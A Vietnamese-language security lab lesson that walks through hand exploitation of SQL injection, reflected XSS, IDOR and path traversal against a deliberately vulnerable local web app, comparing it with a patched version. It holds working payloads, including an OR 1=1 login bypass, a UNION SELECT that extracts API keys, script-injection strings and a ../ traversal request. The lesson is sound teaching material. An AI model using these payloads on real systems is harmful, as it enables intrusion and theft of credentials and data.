# Bài 04 · Khai thác thủ công trên lab (SQLi, XSS, IDOR, Traversal)

**Mục tiêu:** hiểu lỗ hổng bằng TAY — trình duyệt hoặc curl, không qua scanner.
Tất cả payload CHỈ nhắm vào `http://127.0.0.1:3000` (bản vuln).

## 1. SQL Injection

Mở trình duyệt:

```
http://127.0.0.1:3000/search?q=alice        # bình thường: 1 dòng
http://127.0.0.1:3000/search?q=' OR 1=1 --  # injection: 4 dòng — toàn bộ bảng
http://127.0.0.1:3000/search?q='            # error-based: lộ thông báo CSDL
```

Ở trang `/login`, điền `username = ' OR 1=1 --`, mật khẩu tuỳ ý → đăng nhập
thành công với tư cách dòng đầu tiên của bảng (alice/admin).

**Đọc code bị lỗi** (`src/db.js`):

```js
const sql = `SELECT ... WHERE name LIKE '%${q}%'`;   // ← q nằm thẳng trong SQL
```

**Đối chiếu bản đã vá:** thử lại các payload trên ở `http://127.0.0.1:3001`
→ vô hiệu. Đọc `searchUsersSafe()` — placeholder `?` + escape wildcard.

## 2. Reflected XSS

```
http://127.0.0.1:3000/search?q=<svg/onload=alert(1)>
http://127.0.0.1:3000/khong-ton-tai<script>alert(1)</script>   # 404 cũng dính
```

Hình dung tác hại: nếu trang thật, kẻ tấn công gửi cho nạn nhân link này →
JavaScript chạy dưới danh nghĩa nạn nhân → đánh cắp cookie (cookie lab vuln
không có HttpOnly nên `document.cookie` đọc được!).

## 3. IDOR

```bash
curl -s http://127.0.0.1:3000/api/users/1
curl -s http://127.0.0.1:3000/api/users/2     # chưa đăng nhập, vẫn thấy apiKey
```

Viết 1 vòng lặp `for id in 1..4` — bạn vừa "trích xuất toàn bộ CSDL" chỉ bằng
IDOR. Bản hardened trả `401` — vì nó kiểm tra session/ownership.

## 4. Path Traversal (trên hệ thống file ẢO)

```
http://127.0.0.1:3000/download?name=readme.txt
http://127.0.0.1:3000/download?name=../secrets.txt    # escape ra ngoài thư mục
```

Lưu ý an toàn: file ở đây nằm trong RAM (`VFS` trong `app.js`) — nhưng trong
thực tế traversal đọc được `C:\Windows\...` hay `/etc/passwd` thật.

## 5. Viết payload của riêng bạn

- SQLi: dùng `UNION SELECT` để trích cột `apiKey` qua `/search` (gợi ý: bảng có
  4 cột hiển thị, thử `q=' UNION SELECT id,name,role,apiKey FROM users --`).
- XSS: thay `alert(1)` bằng `fetch('http://127.0.0.1:3000/api/users/2')`.
- Kiểm chứng bản hardened chặn được cả payload của bạn.

## ✅ Hoàn thành khi

- [ ] Tự tay khai thác được cả 4 nhóm lỗi trên bản vuln
- [ ] Payload tự viết cũng bị chặn trên bản hardened
- [ ] Giải thích được dòng code gốc gây ra từng lỗi
